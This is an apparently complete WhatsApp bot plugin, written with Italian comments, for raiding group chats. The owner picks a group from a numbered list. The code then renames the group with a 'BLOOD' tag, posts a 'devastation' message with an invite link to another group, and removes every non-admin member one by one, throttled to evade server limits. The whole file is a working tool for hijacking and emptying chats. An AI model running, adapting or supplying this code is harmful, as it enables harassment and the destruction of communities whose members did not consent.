let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    const botId = conn.user.id.includes(':') ? conn.user.id.split(':')[0] + '@s.whatsapp.net' : conn.user.id;

    // 1. RECUPERO LISTA GRUPPI
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);
    
    if (groups.length === 0) return m.reply("❌ Il bot non è in alcun gruppo.");

    // 2. MOSTRA LISTA SE MANCA IL TESTO
    if (!text) {
        let txt = "😈 *Scegli l'obiettivo da flettere:*\n\n";
        groups.forEach((g, i) => {
            txt += `*${i + 1}.* ${g.subject}\n`;
        });
        txt += `\n👉 Scrivi: *.${command} [numero]*`;
        return m.reply(txt);
    }

    // 3. SELEZIONE BERSAGLIO
    let index = parseInt(text) - 1;
    if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");

    let targetChat = groups[index].id;
    let targetName = groups[index].subject;

    await m.reply(`🚀 Inizio pulizia profonda su: *${targetName}*...`);

    try {
        // 4. DOWNLOAD METADATI REALI (Forzato)
        let metadata = await conn.groupMetadata(targetChat, true);
        let participants = metadata.participants;

        // A. CAMBIO NOME
        await conn.groupUpdateSubject(targetChat, `${targetName} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});

        // B. MESSAGGIO DI TESTO
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭ο 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓Ο.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri"
        });

        // C. RIMOZIONE MEMBRI (Uno alla volta per massima sicurezza)
        // Filtriamo: NO bot, NO owner, NO admin
        let usersToRemove = participants
            .filter(p => p.id !== botId && !ownerJids.includes(p.id) && p.admin === null)
            .map(p => p.id);

        if (usersToRemove.length === 0) {
            return m.reply("⚠️ Nessun membro comune trovato (ci sono solo admin o owner).");
        }

        await m.reply(`⚔️ Rimozione di ${usersToRemove.length} membri in corso...`);

        for (let jid of usersToRemove) {
            try {
                // Rimuove un utente alla volta
                await conn.groupParticipantsUpdate(targetChat, [jid], 'remove');
                // Delay di 400ms tra un utente e l'altro per evitare il blocco server
                await new Promise(res => setTimeout(res, 400));
            } catch (err) {
                console.error(`Impossibile rimuovere ${jid}:`, err);
            }
        }

        await m.reply(`✅ Operazione su *${targetName}* terminata.`);

    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore critico. Il bot è ancora admin?");
    }
};

handler.command = ['fotti'];
handler.owner = true;
handler.private = true; 

export default handler;
